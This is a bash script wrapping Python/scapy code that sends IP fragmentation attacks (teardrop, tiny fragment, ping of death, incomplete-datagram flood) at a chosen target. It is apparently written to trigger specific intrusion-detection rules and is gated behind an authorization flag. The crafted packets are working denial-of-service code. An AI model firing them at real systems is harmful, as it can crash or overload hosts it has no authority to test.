#!/usr/bin/env bash
# frag.sh - IP fragmentation attacks with scapy.
# Needs: python3 + scapy, root.
# Triggers: teardrop sid 1000701 (overlapping fragments),
#           tiny     sid 1000702 (tiny fragment),
#           pod      sid 1000703 (oversized reassembled ping of death),
#           flood    sid 1000704 (incomplete datagrams).
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-m teardrop|tiny|pod|flood] [-c COUNT]
  -m MODE   teardrop (default), tiny, pod, or flood
  -c COUNT  datagrams for flood mode (default 500)
U
}

TARGET=""; MODE=teardrop; COUNT=500
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -m|--mode) MODE=${2:?}; shift ;;
    -c|--count) COUNT=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool python3
python3 -c 'import scapy' 2>/dev/null || die "requires scapy (pip install scapy)"
need_root
authorize "$TARGET"
export TARGET MODE COUNT
exec python3 - <<'PY'
import os
from scapy.all import IP, ICMP, UDP, send
t = os.environ["TARGET"]; mode = os.environ["MODE"]; n = int(os.environ["COUNT"])

def teardrop():
    # Two overlapping fragments of one datagram (classic teardrop).
    f1 = IP(dst=t, id=42, frag=0, flags="MF", proto=17)/UDP(sport=53, dport=53)/(b"A"*40)
    f2 = IP(dst=t, id=42, frag=2, flags=0, proto=17)/(b"B"*40)  # offset 16B overlaps f1
    print(f"teardrop: overlapping fragments to {t}")
    send([f1, f2], verbose=1)

def tiny():
    f1 = IP(dst=t, id=43, frag=0, flags="MF", proto=6)/(b"\x00"*8)  # 8-byte first fragment
    f2 = IP(dst=t, id=43, frag=1, flags=0, proto=6)/(b"\x00"*32)
    print(f"tiny: 8-byte first fragment to {t}")
    send([f1, f2], verbose=1)

def pod():
    # Fragments that reassemble to > 65535 bytes: the "ping of death".
    frags = []
    for off in range(0, 65600, 1400):
        mf = 0 if off + 1400 >= 65600 else 1
        frags.append(IP(dst=t, id=44, frag=off//8, flags=("MF" if mf else 0), proto=1)/(b"C"*1400))
    print(f"pod: oversized reassembled ICMP to {t} ({len(frags)} fragments)")
    send(frags, verbose=1)

def flood():
    frags = [IP(dst=t, id=1000+i, frag=0, flags="MF", proto=17)/(b"D"*40) for i in range(n)]
    print(f"flood: {n} incomplete (never-completed) datagrams to {t}")
    send(frags, inter=0.002, verbose=1)

{"teardrop": teardrop, "tiny": tiny, "pod": pod, "flood": flood}.get(mode, teardrop)()
PY
